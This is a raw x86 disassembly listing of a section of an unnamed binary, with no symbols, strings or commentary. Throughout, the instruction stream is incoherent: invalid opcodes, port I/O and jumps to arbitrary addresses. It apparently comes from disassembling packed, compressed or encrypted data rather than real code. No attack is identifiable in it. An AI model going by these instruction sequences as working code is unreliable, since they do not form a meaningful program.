  412781:	push   esp
  412782:	sbb    al,0x51
  412784:	loopne 0x412707
  412786:	xor    al,0x49
  412788:	push   ebp
  412789:	jge    0x4127d4
  41278b:	or     ch,BYTE PTR [esi+0x43]
  41278e:	sub    bh,cl
  412790:	mov    esi,0x23db7256
  412795:	push   ebx
  412796:	ins    DWORD PTR es:[edi],dx
  412797:	in     al,0x99
  412799:	test   DWORD PTR [edx+0x2f383bac],esi
  41279f:	adc    esp,DWORD PTR [ecx-0x6d]
  4127a2:	xor    DWORD PTR [edx+ebx*4-0x31888158],ecx
  4127a9:	inc    eax
  4127aa:	je     0x4127f9
  4127ac:	cmp    DWORD PTR [edx-0x26],ecx
  4127af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127b0:	xchg   edi,eax
  4127b1:	push   ebp
  4127b2:	mov    dh,0x1c
  4127b4:	push   0xca455e7f
  4127b9:	ficom  WORD PTR [ebp-0x1a]
  4127bc:	addr16 or ebp,ecx
  4127bf:	or     al,0xed
  4127c1:	sar    DWORD PTR [ecx-0x15],cl
  4127c4:	pop    edx
  4127c5:	inc    ecx
  4127c6:	xor    edx,edi
  4127c8:	test   bl,dh
  4127ca:	xchg   BYTE PTR [ecx],al
  4127cc:	cdq    
  4127cd:	adc    eax,0xd9866e11
  4127d2:	dec    esi
  4127d3:	loop   0x41276f
  4127d5:	and    DWORD PTR [ecx],ebp
  4127d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d9:	push   eax
  4127da:	and    eax,0x32766444
  4127df:	adc    DWORD PTR [eax+0x75],ecx
  4127e2:	jne    0x412814
  4127e4:	dec    esi
  4127e5:	push   esp
  4127e6:	dec    edi
  4127e7:	sbb    al,0xb9
  4127e9:	ins    BYTE PTR es:[edi],dx
  4127ea:	sbb    BYTE PTR [ebx+0x54ca993],ah
  4127f0:	jecxz  0x41285a
  4127f2:	int3   
  4127f3:	dec    edx
  4127f4:	lds    eax,FWORD PTR [edx]
  4127f6:	jae    0x412870
  4127f8:	ror    BYTE PTR [edi-0x2009f4d3],0x1
  4127ff:	cli    
  412800:	jmp    0x75ea:0xa2cb3cf7
  412807:	mov    ebp,0x4c4e1b2b
  41280c:	push   ecx
  41280d:	mul    DWORD PTR [ebx+0x51]
  412810:	push   eax
  412811:	loopne 0x412871
  412813:	xchg   ebp,eax
  412814:	int3   
  412815:	push   edx
  412816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412817:	sbb    ch,BYTE PTR [edi+edi*2-0x25c60e24]
  41281e:	mov    cl,0x4c
  412820:	mov    al,0x7e
  412822:	or     eax,DWORD PTR [esi]
  412824:	mov    ah,0xc8
  412826:	mov    ebp,0x8d22be9c
  41282b:	aas    
  41282c:	lahf   
  41282d:	xor    ah,dl
  41282f:	mov    ch,0x1b
  412831:	mov    ds:0x38d7286e,al
  412836:	or     eax,0xe55d5f91
  41283b:	cli    
  41283c:	lock ja 0x412805
  41283f:	(bad)  
  412840:	stc    
  412841:	push   edi
  412842:	(bad)  
  412843:	jo     0x412831
  412845:	sbb    dh,BYTE PTR [eax-0x6b]
  412848:	cwde   
  412849:	in     al,0x2d
  41284b:	cli    
  41284c:	add    eax,DWORD PTR [edi-0x2a]
  41284f:	mov    BYTE PTR [si-0x2d],cl
  412853:	and    esp,DWORD PTR [edi-0x4258b90a]
  412859:	cmp    ebx,eax
  41285b:	dec    ebp
  41285c:	jg     0x412879
  41285e:	rcl    DWORD PTR [esi+0x13],1
  412861:	fbstp  TBYTE PTR [edi+0x247da84c]
  412867:	xlat   BYTE PTR ds:[ebx]
  412868:	push   eax
  412869:	xor    ebp,DWORD PTR [ebx+edi*4-0x2d]
  41286d:	inc    edx
  41286e:	or     dh,bl
  412870:	mov    edi,0xf2ded834
  412875:	out    0xd,eax
  412877:	jae    0x41289d
  412879:	and    cl,BYTE PTR [ecx-0x4b872c1f]
  41287f:	cmp    esi,DWORD PTR [eax+0x1a]
  412882:	jnp    0x412815
  412884:	jns    0x412862
  412886:	pop    edi
  412887:	fwait
  412888:	shr    DWORD PTR [edx-0x55e93192],cl
  41288e:	fstp   st(4)
  412890:	repnz (bad) 
  412893:	pop    esp
  412894:	cmp    eax,DWORD PTR ds:0x704bcb36
  41289a:	inc    edx
  41289b:	fldcw  WORD PTR [edx]
  41289d:	inc    edi
  41289e:	and    ebx,edi
  4128a0:	rcl    BYTE PTR [edx+ecx*2-0x662730d2],0xa5
  4128a8:	test   eax,0x2f126436
  4128ad:	xor    esi,DWORD PTR [ebx]
  4128af:	and    eax,DWORD PTR ds:0xe1395ed
  4128b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128b6:	lahf   
  4128b7:	test   al,0xb3
  4128b9:	dec    ebp
  4128ba:	and    al,0x70
  4128bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128bd:	push   ebx
  4128be:	fstp   DWORD PTR [ebp+0x10aa0a8]
  4128c4:	shl    ah,cl
  4128c6:	dec    esi
  4128c7:	fwait
  4128c8:	lods   eax,DWORD PTR ds:[esi]
  4128c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ca:	mov    esi,0x41ea2e7a
  4128cf:	xor    BYTE PTR [ecx-0x10],bl
  4128d2:	push   ebp
  4128d3:	mov    BYTE PTR [edx],dl
  4128d5:	xor    DWORD PTR [eax+0x24f36694],edi
  4128db:	mov    eax,ds:0x9e193654
  4128e0:	(bad)  
  4128e1:	pop    edx
  4128e2:	cld    
  4128e3:	pop    esi
  4128e4:	dec    esp
  4128e5:	jmp    0x412963
  4128e7:	sbb    ebp,ecx
  4128e9:	ins    BYTE PTR es:[edi],dx
  4128ea:	add    DWORD PTR [ebx-0x2],edi
  4128ed:	test   eax,0x91372442
  4128f2:	enter  0x4b4,0xc7
  4128f6:	or     BYTE PTR [ecx],dl
  4128f8:	imul   edi,esp,0xffffffcd
  4128fb:	retf   0x51dd
  4128fe:	imul   ebp,DWORD PTR [ecx+eiz*1],0x3400b2cb
  412905:	add    dh,dl
  412907:	mov    eax,ds:0xb9893b22
  41290c:	loope  0x41293c
  41290e:	fwait
  41290f:	pusha  
  412910:	add    eax,0x58912273
  412915:	sbb    DWORD PTR [esi],esp
  412917:	fld    DWORD PTR [esp+ecx*1+0xd]
  41291b:	push   edi
  41291c:	rcr    bl,0xc
  41291f:	and    eax,0xa560b0af
  412924:	test   DWORD PTR [eax],edi
  412926:	(bad)
  412929:	cmc    
  41292a:	pop    esi
  41292b:	mov    ds:0x78653c7c,al
  412930:	daa    
  412931:	mov    DWORD PTR [ebx-0x5337a84b],0xc960470b
  41293b:	dec    ecx
  41293c:	xor    eax,esi
  41293e:	xchg   esp,eax
  41293f:	add    ebx,DWORD PTR [eax]
  412941:	jge    0x4128c7
  412943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412944:	jle    0x4128e8
  412946:	std    
  412947:	(bad)  [ecx+0x6857ce03]
  41294d:	jmp    0xd83d8ce1
  412952:	in     al,dx
  412953:	popf   
  412954:	cwde   
  412955:	pop    ebp
  412956:	adc    DWORD PTR [ebx+0x6f282b13],ebp
  41295c:	test   BYTE PTR [ebx-0x29],bh
  41295f:	clc    
  412960:	out    dx,eax
  412961:	ret    
  412962:	fwait
  412963:	or     bl,BYTE PTR [edx+eax*8]
  412966:	and    al,0x7f
  412968:	out    0x60,al
  41296a:	dec    ebx
  41296b:	mov    edx,0x4a4c1c2a
  412970:	jg     0x41295b
  412972:	inc    esi
  412973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412974:	jge    0x41293b
  412976:	out    0xec,al
  412978:	loop   0x41292a
  41297a:	popa   
  41297b:	scas   eax,DWORD PTR es:[edi]
  41297c:	cli    
  41297d:	fcomp  QWORD PTR [edx]
  41297f:	pop    edi
  412980:	mov    ebp,DWORD PTR [eax+edi*8]
  412983:	prefetchw (bad)
  412984:	or     eax,0x344049cd
  412989:	jbe    0x412977
  41298b:	xchg   edi,eax
  41298c:	out    dx,eax
  41298d:	sahf   
  41298e:	imul   edx,DWORD PTR [ebx+edx*2-0x2a],0x73
  412993:	sti    
  412994:	mov    esi,0x9e82107c
  412999:	dec    ecx
  41299a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41299b:	xchg   edx,eax
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	adc    eax,0xd3206f12
  4129a2:	ja     0x4129c7
  4129a4:	jae    0x412961
  4129a6:	(bad)  
  4129a7:	(bad)  
  4129a8:	mov    al,0x41
  4129aa:	aaa    
  4129ab:	imul   edx,ecx,0xffffffd2
  4129ae:	dec    esi
  4129af:	cmp    DWORD PTR [ebx],eax
  4129b1:	pop    ss
  4129b2:	jo     0x4129eb
  4129b4:	fs out dx,al
  4129b6:	mov    edx,0xe8ea0b38
  4129bb:	pop    es
  4129bc:	jb     0x412a36
  4129be:	in     eax,0x51
  4129c0:	sbb    ebp,DWORD PTR [esi]
  4129c2:	pop    ebp
  4129c3:	ja     0x412a00
  4129c5:	cmp    bl,BYTE PTR [esi-0xf7c9c8b]
  4129cb:	xor    esi,DWORD PTR [ebp+0x7343cb44]
  4129d1:	mov    esi,0x46982caf
  4129d6:	push   esi
  4129d7:	pop    esp
  4129d8:	xchg   esi,eax
  4129d9:	or     ah,BYTE PTR [ebx]
  4129db:	inc    edi
  4129dc:	jmp    0x412989
  4129de:	push   es
  4129df:	adc    ch,BYTE PTR [esi+eax*8+0x1]
  4129e3:	xor    edi,esi
  4129e5:	mov    edi,0x75aad8e9
  4129ea:	push   ds
  4129eb:	mov    bl,0xa6
  4129ed:	inc    edi
  4129ee:	or     ebx,DWORD PTR [ebx+0x11]
  4129f1:	dec    ebp
  4129f2:	push   es
  4129f3:	sbb    BYTE PTR ds:0x2b240d1a,al
  4129f9:	inc    ecx
  4129fa:	dec    edx
  4129fb:	test   ebp,edi
  4129fd:	adc    edx,eax
  4129ff:	mov    ebp,0x727c03f1
  412a04:	mov    edi,0x94235112
  412a09:	jmp    0x7e97cb34
  412a0e:	cmp    ecx,DWORD PTR [edi+0x20]
  412a11:	sub    ebx,0x3f562d94
  412a17:	repz out dx,al
  412a19:	add    bh,BYTE PTR [esp+eax*1+0x38]
  412a1d:	or     ebx,esi
  412a1f:	stc    
  412a20:	mov    dh,0x9d
  412a22:	mov    ah,0xf
  412a24:	jge    0x412a13
  412a26:	jle    0x4129bc
  412a28:	push   ds
  412a29:	or     BYTE PTR [edi],ch
  412a2b:	pushf  
  412a2c:	sbb    DWORD PTR [ebp-0x42e41415],0xb4235bfe
  412a36:	or     al,0x2f
  412a38:	inc    edi
  412a39:	(bad)  
  412a3a:	sub    eax,0x80b03dc1
  412a3f:	xor    BYTE PTR [ebp-0x9b35aab],al
  412a45:	in     eax,dx
  412a46:	cli    
  412a47:	daa    
  412a48:	xchg   esp,eax
  412a49:	outs   dx,BYTE PTR ds:[esi]
  412a4a:	addr16 sub eax,0xc8689033
  412a50:	mul    ebx
  412a52:	cmp    al,0xce
  412a54:	leave  
  412a55:	mov    eax,ds:0xff9b8503
  412a5a:	repnz push ebp
  412a5c:	(bad)  
  412a5d:	(bad)  
  412a5f:	clc    
  412a60:	add    BYTE PTR [ecx+0x4e],0x4b
  412a64:	mov    eax,ds:0x9a47c635
  412a69:	(bad)  
  412a6a:	and    eax,DWORD PTR [ebx]
  412a6c:	imul   esp,ebx,0x1d115d2e
  412a72:	not    cl
  412a74:	or     ah,BYTE PTR [ebx-0x3b1bf501]
  412a7a:	mov    WORD PTR [esi],gs
  412a7c:	push   esi
  412a7d:	cmp    DWORD PTR [eax+0x6c0042ff],ebx
  412a83:	xor    eax,0xb0216c19
  412a88:	aad    0x6a
  412a8a:	fdivr  QWORD PTR [esi-0x2d]
  412a8d:	cmp    BYTE PTR [edi],bl
  412a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a90:	mov    bl,0x8f
  412a92:	pusha  
  412a93:	and    dh,dh
  412a95:	inc    ebp
  412a96:	cmp    ch,bl
  412a98:	mov    esi,0x9d48dedd
  412a9d:	sbb    DWORD PTR [edi+0x6b],edi
  412aa0:	or     DWORD PTR [eax-0x12a0f518],esp
  412aa6:	add    al,0xef
  412aa8:	xchg   ebp,eax
  412aa9:	dec    ebx
  412aaa:	jae    0x412a7f
  412aac:	gs sub eax,0x8cdfaab9
  412ab2:	jp     0x412aa6
  412ab4:	inc    edi
  412ab5:	loopne 0x412a4b
  412ab7:	out    dx,eax
  412ab8:	mov    edi,0xf89d403a
  412abd:	into   
  412abe:	lea    eax,ds:0xd67f7f8b
  412ac4:	pushf  
  412ac5:	add    edx,eax
  412ac7:	lods   al,BYTE PTR ds:[esi]
  412ac8:	aaa    
  412ac9:	push   ecx
  412aca:	mov    eax,0xbbb6b27e
  412acf:	sti    
  412ad0:	push   ecx
  412ad1:	aas    
  412ad2:	test   cl,cl
  412ad4:	mov    es,esp
  412ad6:	imul   edi,edx,0x23
  412ad9:	test   eax,0x18279af3
  412ade:	mov    esp,0xc75d98ca
  412ae3:	adc    eax,0xa9b06886
  412ae8:	repnz div edi
  412aeb:	and    eax,0xc03aa762
  412af0:	mov    edx,0x138e91c3
  412af5:	pop    ebx
  412af6:	pop    eax
  412af7:	in     eax,0x25
  412af9:	fst    st(3)
  412afb:	fldl2t 
  412afd:	add    DWORD PTR [edx],0xc09e3c31
  412b03:	gs stc 
  412b05:	xchg   DWORD PTR [ebp+0x33fdc06e],edi
  412b0b:	lods   al,BYTE PTR ds:[esi]
  412b0c:	pusha  
  412b0d:	xor    al,BYTE PTR [ebp+0x5f]
  412b10:	jmp    0xa609267a
  412b15:	push   esp
  412b16:	mov    eax,ds:0xc9eb6216
  412b1b:	xrelease xchg DWORD PTR [esi+0x216e14ee],ebp
  412b22:	sub    eax,0xae675d0b
  412b27:	mul    DWORD PTR [eax+0x4e9c33ff]
  412b2d:	jmp    0x527c68eb
  412b32:	sbb    al,0xb0
  412b34:	sub    al,0xf1
  412b36:	push   edx
  412b37:	adc    eax,0x63e3b377
  412b3c:	aas    
  412b3d:	jl     0x412b04
  412b3f:	test   BYTE PTR [ecx+0x1a],cl
  412b42:	ja     0x412b24
  412b44:	cli    
  412b45:	sbb    al,dl
  412b47:	mov    DWORD PTR [ebx-0x1b],edx
  412b4a:	push   0xcd138fae
  412b4f:	jl     0x412b51
  412b51:	xchg   ebx,eax
  412b52:	mov    BYTE PTR [esi+0xab08d8f],0xb7
  412b59:	iret   
  412b5a:	ins    DWORD PTR es:[edi],dx
  412b5b:	scas   al,BYTE PTR es:[edi]
  412b5c:	popf   
  412b5d:	imul   ebp,esp,0xb
  412b60:	jno    0x412b0a
  412b62:	out    dx,eax
  412b63:	test   al,0x8e
  412b65:	shl    DWORD PTR [ecx+0x10],1
  412b68:	or     dl,BYTE PTR fs:[ecx-0x4003df66]
  412b6f:	pop    edi
  412b70:	dec    edi
  412b71:	bound  ebx,QWORD PTR [edx*8+0x629618e5]
  412b78:	pop    ebx
  412b79:	dec    esi
  412b7a:	push   edx
  412b7b:	sub    DWORD PTR [edx+0x3bd0f102],edx
  412b81:	xor    dh,BYTE PTR [edi]
  412b83:	cld    
  412b84:	aas    
  412b85:	inc    edi
  412b86:	(bad)  
  412b87:	sbb    DWORD PTR [ebx-0x26],0x4533c9cc
  412b8e:	das    
  412b8f:	push   ebx
  412b90:	scas   eax,DWORD PTR es:[edi]
  412b91:	xchg   ebp,eax
  412b92:	adc    ah,BYTE PTR ds:0x866d8f63
  412b98:	daa    
  412b99:	push   ebp
  412b9a:	cdq    
  412b9b:	call   0x728e:0x5b77dc9a
  412ba2:	loope  0x412c0a
  412ba4:	daa    
  412ba5:	ret    0xc4be
  412ba8:	jp     0x412c26
  412baa:	or     ebx,ebx
  412bac:	das    
  412bad:	push   0x71
  412baf:	and    esp,0x32
  412bb2:	pushf  
  412bb3:	push   esi
  412bb4:	xchg   edi,eax
  412bb5:	push   edx
  412bb6:	lods   eax,DWORD PTR ds:[esi]
  412bb7:	cmp    DWORD PTR [edx+0x3d],ebx
  412bba:	add    al,0x3
  412bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bbd:	push   0xffffffad
  412bbf:	ss aaa 
  412bc1:	addr16 mov edi,0x6ef0b20b
  412bc7:	(bad)  
  412bc8:	jno    0x412b90
  412bca:	xor    DWORD PTR [edi+0x4a],esi
  412bcd:	arpl   WORD PTR [edi+eax*2+0x4d18ab8d],cx
  412bd4:	int    0xcf
  412bd6:	inc    ebx
  412bd7:	enter  0xa497,0x77
  412bdb:	xor    ecx,DWORD PTR [eax-0x1a2ce54c]
  412be1:	or     eax,0x464bc84
  412be6:	or     BYTE PTR [esi+ecx*8+0x3a],0x0
  412beb:	mov    al,0x25
  412bed:	es mov bh,0x2
  412bf0:	cld    
  412bf1:	fiadd  WORD PTR [ecx+0x43c91bae]
  412bf7:	sub    dh,BYTE PTR [ecx-0x38dddea6]
  412bfd:	adc    edx,0xffffff8f
  412c00:	fadd   QWORD PTR [ebx+0x2b913858]
  412c06:	dec    ebx
  412c07:	popf   
  412c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c09:	scas   al,BYTE PTR es:[edi]
  412c0a:	pop    es
  412c0b:	xor    ch,BYTE PTR [edi]
  412c0d:	dec    ecx
  412c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c0f:	out    0xc3,eax
  412c11:	scas   al,BYTE PTR es:[edi]
  412c12:	(bad)  
  412c14:	mov    ah,0x7e
  412c16:	jo     0x412baf
  412c18:	inc    ecx
  412c19:	out    0x42,eax
  412c1b:	repnz call FWORD PTR [esi]
  412c1e:	jno    0x412baf
  412c20:	sti    
  412c21:	adc    ch,BYTE PTR [eax+0x48]
  412c24:	sub    ah,BYTE PTR [eax-0x4f]
  412c27:	add    edx,DWORD PTR [esi+0x3b96a58f]
  412c2d:	arpl   WORD PTR [ebx+0x266be9b8],bx
  412c33:	les    edi,FWORD PTR [edx+ebx*1-0xc3d879f]
  412c3a:	fcomp  DWORD PTR [esi+0x6bbdd8e]
  412c40:	popa   
  412c41:	retf   0x6e0b
  412c44:	fimul  WORD PTR [ebx+0x69]
  412c47:	jns    0x412c25
  412c49:	or     ch,BYTE PTR [eax+0x11]
  412c4c:	mov    dh,0x27
  412c4e:	sti    
  412c4f:	push   es
  412c50:	add    bh,BYTE PTR [ecx]
  412c52:	mov    dl,0x93
  412c54:	jg     0x412ca8
  412c56:	and    ch,BYTE PTR [esi]
  412c58:	test   ecx,edx
  412c5a:	adc    edx,edx
  412c5c:	xlat   BYTE PTR ds:[ebx]
  412c5d:	add    eax,0x90cf528a
  412c62:	in     al,0x72
  412c64:	leave  
  412c65:	inc    esp
  412c66:	test   eax,0x5c203bb3
  412c6b:	ret    0xa209
  412c6e:	dec    edx
  412c6f:	push   eax
  412c70:	shr    DWORD PTR [eax+0x4f],1
  412c73:	cmp    DWORD PTR [eax-0x25],ecx
  412c76:	and    ebx,DWORD PTR [eax]
  412c78:	mov    dl,0x5f
  412c7a:	mov    dl,0x7b
  412c7c:	mov    dh,BYTE PTR [edi+0x8]
  412c7f:	adc    eax,0xa0d1bd63
  412c84:	and    eax,0x786f8d7
  412c89:	dec    eax
  412c8a:	xchg   esi,eax
  412c8b:	pop    esi
  412c8c:	rcl    BYTE PTR [esi],0x6b
  412c8f:	push   ds
  412c90:	loopne 0x412c2a
  412c92:	lea    edx,[ebp+esi*4+0x316de092]
  412c99:	sahf   
  412c9a:	jno    0x412c1f
  412c9c:	aas    
  412c9d:	pop    ebx
  412c9e:	addr16 int 0xc
  412ca1:	dec    esi
  412ca2:	xchg   ecx,eax
  412ca3:	add    eax,0xf214a29f
  412ca8:	loope  0x412c87
  412caa:	xchg   ebp,eax
  412cab:	pop    ds
  412cac:	in     al,0xb6
  412cae:	sub    ebx,DWORD PTR [ecx-0x3dd18417]
  412cb4:	ja     0x412cfb
  412cb6:	xchg   ebp,eax
  412cb7:	dec    esi
  412cb8:	stos   BYTE PTR es:[edi],al
  412cb9:	in     al,dx
  412cba:	jns    0x412d04
  412cbc:	dec    ecx
  412cbd:	sbb    edi,esi
  412cbf:	push   ebx
  412cc0:	mov    edx,0x6b290d75
  412cc5:	jae    0x412c7f
  412cc7:	mov    DWORD PTR [edi],eax
  412cc9:	arpl   si,ax
  412ccb:	fisttp QWORD PTR [edx+0x26]
  412cce:	sub    esp,DWORD PTR [ebp-0x35]
  412cd1:	mov    bh,0x86
  412cd3:	sbb    al,0xe5
  412cd5:	sbb    DWORD PTR [ebp-0x40ed686d],ebx
  412cdb:	fimul  DWORD PTR es:[eax-0x1d]
  412cdf:	xlat   BYTE PTR ds:[ebx]
  412ce0:	sub    BYTE PTR [esi],0x41
  412ce3:	pop    eax
  412ce4:	and    BYTE PTR [ecx-0x6c],0x34
  412ce8:	push   ebx
  412ce9:	mov    al,ds:0xe17b13ff
  412cee:	loope  0x412c7a
  412cf0:	retf   
  412cf1:	scas   al,BYTE PTR es:[edi]
  412cf2:	sbb    eax,0xc323fbf0
  412cf7:	push   edi
  412cf8:	jbe    0x412caf
  412cfa:	add    al,0x61
  412cfc:	adc    ebx,edx
  412cfe:	sub    BYTE PTR [eax-0x1c766b37],dl
  412d04:	sbb    al,0xf8
  412d06:	xchg   BYTE PTR [ebp-0x23f2c07b],bh
  412d0c:	cmp    esp,edx
  412d0e:	in     eax,dx
  412d0f:	scas   al,BYTE PTR es:[edi]
  412d10:	or     DWORD PTR [edx+0x69],esp
  412d13:	pop    ds
  412d14:	or     ah,dh
  412d16:	(bad)  
  412d18:	jnp    0x412d13
  412d1a:	adc    DWORD PTR [esi],0x2d
  412d1d:	sub    DWORD PTR [eax-0x41],ecx
  412d20:	ins    DWORD PTR es:[edi],dx
  412d21:	or     BYTE PTR [edi],dh
  412d23:	shr    BYTE PTR [eax],1
  412d25:	fcom   QWORD PTR [ecx]
  412d27:	sar    BYTE PTR [ebx],0xe7
  412d2a:	push   ds
  412d2b:	loope  0x412d16
  412d2d:	inc    ebp
  412d2e:	dec    ecx
  412d2f:	xor    eax,0x45d3f01f
  412d34:	(bad)  
  412d35:	and    esi,DWORD PTR [edi-0x7cb36e5e]
  412d3b:	jmp    0xbd789411
  412d40:	stc    
  412d41:	dec    ecx
  412d42:	inc    edx
  412d43:	push   0x4f
  412d45:	pop    edi
  412d46:	iret   
  412d47:	fist   DWORD PTR [eax-0x28db2e4d]
  412d4d:	rol    DWORD PTR [edi],1
  412d4f:	js     0x412d92
  412d51:	(bad)  
  412d53:	daa    
  412d54:	and    BYTE PTR [ebp-0x50],dl
  412d57:	test   al,0xb1
  412d59:	shr    DWORD PTR [edi+0x239174d1],1
  412d5f:	cld    
  412d60:	retf   
  412d61:	hlt    
  412d62:	mov    ds:0x6ba442ec,al
  412d67:	aad    0x9d
  412d69:	mov    dl,0x73
  412d6b:	ror    BYTE PTR [edi+edx*8-0x7b],1
  412d6f:	shl    DWORD PTR [edi+0x76],0x80
  412d73:	imul   ch
  412d75:	xchg   ecx,eax
  412d76:	in     eax,0x4e
  412d78:	in     eax,0x40
  412d7a:	mov    al,0x20
  412d7c:	pop    es
  412d7d:	and    DWORD PTR [ebx+edi*8],edx
  412d80:	test   al,0xa7
  412d82:	cdq    
  412d83:	pop    eax
  412d84:	loop   0x412df1
  412d86:	add    DWORD PTR [esi-0x4d],esp
  412d89:	push   esp
  412d8a:	fsubr  DWORD PTR [ebp+0x268dcaa5]
  412d90:	adc    ecx,DWORD PTR [edx-0x11d1be9e]
  412d96:	pop    ebp
  412d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d98:	ins    BYTE PTR es:[edi],dx
  412d99:	xchg   edi,eax
  412d9a:	jge    0x412d26
  412d9c:	adc    al,0x8b
  412d9e:	xor    esi,DWORD PTR [esi-0x7352437e]
  412da4:	rcl    DWORD PTR [esi],cl
  412da6:	cwde   
  412da7:	out    dx,al
  412da8:	push   ds
  412da9:	push   0xffffffa5
  412dab:	shl    BYTE PTR [edi+0xe5a2781],cl
  412db1:	push   cs
  412db2:	inc    ebp
  412db3:	bsr    eax,ebx
  412db6:	(bad)  
  412db7:	fstp   TBYTE PTR [ecx-0x19]
  412dba:	dec    ebx
  412dbb:	push   ss
  412dbc:	iret   
  412dbd:	sub    bh,dl
  412dbf:	ins    BYTE PTR es:[edi],dx
  412dc0:	gs pop eax
  412dc2:	adc    BYTE PTR [bp+si-0x2e],cl
  412dc6:	or     ebx,DWORD PTR [esi]
  412dc8:	xsha1  
  412dcb:	and    BYTE PTR [ebp-0x38],ah
  412dce:	sbb    BYTE PTR [edi+0x69ebcdfb],dl
  412dd4:	jge    0x412dcb
  412dd6:	push   ebx
  412dd7:	mov    bh,0x22
  412dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dda:	pop    ss
  412ddb:	in     al,0xf9
  412ddd:	loope  0x412d85
  412ddf:	inc    edi
  412de0:	retf   
  412de1:	test   DWORD PTR [eax],eax
  412de3:	xchg   ebp,eax
  412de4:	scas   eax,DWORD PTR es:[edi]
  412de5:	mov    dh,BYTE PTR [ebp-0x515b50f5]
  412deb:	jnp    0x412d74
  412ded:	xor    DWORD PTR [edx-0x5c],esi
  412df0:	icebp  
  412df1:	pushf  
  412df2:	fidivr WORD PTR [edx+ebp*4-0x7d362973]
  412df9:	sbb    eax,0x562eea7b
  412dfe:	adc    al,0xb9
  412e00:	or     DWORD PTR [ebx-0x7f],ecx
  412e03:	loope  0x412e83
  412e05:	imul   edi,DWORD PTR [eax+0xa],0x16930445
  412e0c:	add    al,0x37
  412e0e:	fisttp WORD PTR [ebx]
  412e10:	mov    ch,0x43
  412e12:	sbb    al,0x9f
  412e14:	push   ss
  412e15:	jmp    0x412dae
  412e17:	mov    ah,BYTE PTR [edi-0x19624605]
  412e1d:	xchg   DWORD PTR [ebp+0x7b94f5b6],edx
  412e23:	rcr    DWORD PTR [esi-0x60],cl
  412e26:	push   esi
  412e27:	cs ret 0x35b1
  412e2b:	mov    cl,0xd3
  412e2d:	gs popa 
  412e2f:	retf   
  412e30:	fstp   TBYTE PTR [ebp+0x41]
  412e33:	push   edx
  412e34:	pop    ecx
  412e35:	add    al,0x3b
  412e37:	dec    esp
  412e38:	push   ss
  412e39:	jae    0x412e72
  412e3b:	(bad)
  412e3f:	mov    gs,WORD PTR [ebp-0x4]
  412e42:	es dec eax
  412e44:	inc    ebx
  412e45:	cmp    esp,ecx
  412e47:	cwde   
  412e48:	sub    BYTE PTR [ebp-0x7d],cl
  412e4b:	jg     0x412e8c
  412e4d:	lods   eax,DWORD PTR ds:[esi]
  412e4e:	addr16 and al,0xd7
  412e51:	dec    ebp
  412e52:	cld    
  412e53:	ret    0x874b
  412e56:	mov    esi,0x60a1cbff
  412e5b:	xor    al,0x90
  412e5d:	and    ch,BYTE PTR [ebx]
  412e5f:	dec    eax
  412e60:	mov    DWORD PTR [ecx+0x25],ecx
  412e63:	fwait
  412e64:	xchg   ebp,eax
  412e65:	add    BYTE PTR [ebp+0x5cd82a0b],0x98
  412e6c:	pop    eax
  412e6d:	stc    
  412e6e:	test   DWORD PTR [esi-0x22],esi
  412e71:	xor    eax,0x5e02fe12
  412e76:	lea    ebx,[esp+edi*2]
  412e79:	jne    0x412e27
  412e7b:	pop    esp
  412e7c:	xor    bl,cl
  412e7e:	ficomp DWORD PTR [eax+0x6c]
  412e81:	sahf   
  412e82:	(bad)  
  412e83:	fst    st(5)
  412e85:	cmp    ebp,esi
  412e87:	ret    
  412e88:	mov    dh,0xad
  412e8a:	ja     0x412f02
  412e8c:	bound  ebx,QWORD PTR [esi+0x57]
  412e8f:	lods   eax,DWORD PTR ds:[esi]
  412e90:	cs cli 
  412e92:	outs   dx,DWORD PTR ds:[esi]
  412e93:	cli    
  412e94:	loope  0x412ead
  412e96:	and    al,0xb
  412e98:	sub    eax,0xa4f04c14
  412e9d:	mov    al,0xf5
  412e9f:	sbb    bh,0x70
  412ea2:	retf   
  412ea3:	js     0x412ed3
  412ea5:	les    eax,FWORD PTR [ebx]
  412ea7:	mov    dh,0x61
  412ea9:	or     BYTE PTR [eax],bl
  412eab:	fisubr WORD PTR [eax+0x64bba7cc]
  412eb1:	fwait
  412eb2:	fs dec ebp
  412eb4:	adc    eax,0xe6249dfb
  412eb9:	int3   
  412eba:	cld    
  412ebb:	cmp    DWORD PTR [eax],0xa78e4442
  412ec1:	jge    0x412ec5
  412ec3:	add    eax,0x4b64379
  412ec8:	mov    al,BYTE PTR [ecx-0x4f]
  412ecb:	(bad)  
  412ecc:	enter  0x5556,0xb0
  412ed0:	(bad)  
  412ed1:	cmc    
  412ed2:	outs   dx,DWORD PTR ds:[esi]
  412ed3:	test   eax,ebp
  412ed5:	adc    BYTE PTR [eax],ch
  412ed7:	dec    edx
  412ed8:	and    al,0x12
  412eda:	loop   0x412f05
  412edc:	inc    edx
  412edd:	call   DWORD PTR [edi+0x73d73ab0]
  412ee3:	pop    esi
  412ee4:	cld    
  412ee5:	dec    edx
  412ee6:	mov    WORD PTR ds:0xdc2c4c72,ss
  412eec:	jbe    0x412ee9
  412eee:	shl    BYTE PTR [ebp-0x3ab1e4bd],cl
  412ef4:	mov    dh,BYTE PTR [eax+0x1a037321]
  412efa:	arpl   WORD PTR [edx+ebx*4-0x76],bx
  412efe:	rol    ah,0x4e
  412f01:	sbb    DWORD PTR [edx+0x5d5c6f9b],0x1f
  412f08:	cmc    
  412f09:	scas   eax,DWORD PTR es:[edi]
  412f0a:	jnp    0x412f55
  412f0c:	leave  
